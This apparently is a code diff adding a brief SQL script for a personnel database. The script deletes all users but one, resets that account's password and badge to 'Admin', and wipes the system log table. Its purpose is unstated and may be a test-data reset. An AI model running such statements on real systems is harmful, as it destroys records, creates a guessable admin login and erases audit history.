@@ -1,0 +1,11 @@
+
+
+
+
+
+
+DELETE from i9SysPersonnel where BadgeNumber <> '5150'
+--SELECT * from i9SysPersonnel
+update i9SysPersonnel set Password = 'Admin', BadgeNumber = 'Admin' where BadgeNumber = '5150'
+DELETE FROM i9SysLog
+--select * FROM i9SysLog order by LogDateTime asc
